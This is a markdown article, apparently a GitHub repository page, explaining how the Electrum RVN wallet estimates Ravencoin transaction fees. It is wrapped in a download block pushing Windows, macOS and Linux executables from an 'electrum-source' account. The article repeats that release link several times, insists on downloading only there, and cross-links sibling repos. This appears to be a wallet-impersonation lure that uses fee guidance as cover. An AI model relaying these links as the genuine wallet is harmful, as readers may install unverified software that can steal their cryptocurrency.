![Electrum RVN](assets/banner-article.png)

# Ravencoin Fee Estimation in Electrum RVN

<!-- compact-download-block -->

<p align="center">Where the number comes from and why it changes</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
The wallet estimates a fee from the server it is connected to: a rate in RVN per unit of transaction size, applied to the transaction you built. It is a good default most of the time, it is not a promise, and it can be raised after the fact with Replace-By-Fee if the queue moves against you.

## Where the number comes from

Three inputs, and knowing them explains almost every surprise:

**The server's estimate.** The wallet asks what rate is currently clearing and offers it. A server that is behind, or one under different conditions, gives a different answer - which is why two wallets can quote different fees for the same payment.

**The transaction's size.** Size depends on how many inputs the transaction spends, not on the amount. A payment funded by one coin is small; one funded by thirty small receipts is large.

**Your choice.** The wallet lets you override the rate. That is a feature for people who understand the trade and a trap for people who set it to the minimum to save a fraction of a cent.

## Reading the fee screen

The Send tab shows the amount, the fee and the total. Read all three:

- **the fee in RVN**, which is what actually leaves your wallet;
- **the rate**, if the wallet displays it, which is what determines whether it confirms quickly;
- **the total**, which should equal amount plus fee.

If the fee looks disproportionate to the amount, the transaction is probably large - many small inputs. That is a consolidation problem, not a fee-setting problem, and the fix is to merge inputs during a quiet period rather than to underpay now.

## The three positions

| Position | When | Risk |
| --- | --- | --- |
| Default estimate | almost always | waits if the mempool spikes |
| Above default | a payment with a deadline | you overpay slightly |
| Below default | a transfer to yourself, no deadline | may sit unconfirmed |

There is no fourth position called "free". A zero-fee transaction is not relayed, and the wallet will not build one.

## Why estimates go stale

An estimate is a snapshot. Between building the transaction and its being mined, the queue can change - a burst of activity raises the clearing rate, and your transaction, priced at the old rate, waits.

That is not a bug in the estimate; it is the nature of a market. The defence is a fee that is comfortably above the floor for anything urgent, and Replace-By-Fee for everything else.

## Raising a fee after broadcast

The wallet supports bumping a transaction from the Transactions tab. The replacement carries the same destination and amount with a higher fee, and the network accepts it in place of the original.

[Stuck Ravencoin transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md) is the procedure, including what to do when the bump option is unavailable.

## Estimating for a batch of payments

If you are sending many payments, the sizes add up: each output adds bytes, and many inputs add signatures. A batch that spends a wallet full of small payouts can cost more in fees than the total being sent.

Two ways to keep it sane: consolidate first so each payment spends few inputs, and avoid sending dust amounts that cost more to move than they are worth.

## Fees and assets

Issuing and transferring assets pay fees in RVN like any transaction, and an asset payload adds size. That is why a wallet holding an asset and no RVN cannot move it - the fee has nowhere to come from.

What issuance costs on top of the fee is a chain-level charge, not an estimate: [Ravencoin asset issuance cost](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md) covers the structure without inventing a figure.

## When the estimate looks wrong

**Update the wallet.** Estimates are read from the server, and a stale build can misread the answer - https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0.

**Try a different server.** A server that is behind gives a stale rate; switching and re-estimating is a legitimate check.

**Check your own clock.** A system clock far off can break the connection entirely, which produces no estimate at all - [Electrum RVN will not connect to a server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md).

**Check the transaction size.** If the fee is large, the cause is inputs, not the rate.

## A habit that saves money

Estimate, then add a margin for anything that must confirm promptly. Fees are small relative to the amounts people move; a payment that sits for six hours to save a few RVN is a poor trade, and the correction afterwards usually costs more than the margin would have.

For the address side of a send, [wrong address sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md) is the failure that no fee can fix. For privacy, [Ravencoin privacy with Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-privacy-with-electrum-rvn.md) explains what the server learns when you ask it for a rate. An asset transfer is a normal transaction fee plus the payload, and the wallet's own fee screen is described in [Electrum RVN transaction fees explained](https://github.com/electrum-source/download-and-setup/blob/main/electrum-rvn-transaction-fees-explained.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. [Sending Ravencoin from Electrum RVN](https://github.com/electrum-source/download-and-setup/blob/main/sending-ravencoin-from-electrum-rvn.md) is the full send procedure this page's fee step belongs to, and [issuing a Ravencoin asset](https://github.com/electrum-source/token-and-network/blob/main/issue-a-ravencoin-asset-in-electrum-rvn.md) is the other place the fee screen appears.

## FAQ

### How is the fee calculated?

A rate in RVN applied to the transaction's size in bytes. Size comes from inputs and outputs, not from the amount sent.

### Why do two wallets show different fees?

They may be connected to different servers, with different estimates and different views of the queue.

### Can I set the fee myself?

Yes. The wallet lets you override the rate; the trade is speed against cost.

### What happens if the estimate is too low?

The transaction waits. It can be replaced with a higher fee from the Transactions tab.

### Does the fee depend on how much RVN I send?

No. A large payment and a small one cost the same if their transactions are the same size.

<!-- related-articles -->

## Related articles

- [Stuck Ravencoin Transaction in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/stuck-ravencoin-transaction-in-electrum-rvn.md)
- [Ravencoin Asset Issuance Cost in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/ravencoin-asset-issuance-cost-in-electrum-rvn.md)
- [Electrum RVN Will Not Connect to a Server](https://github.com/electrum-source/token-and-network/blob/main/electrum-rvn-will-not-connect-to-a-server.md)
- [Wrong Address Sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md)
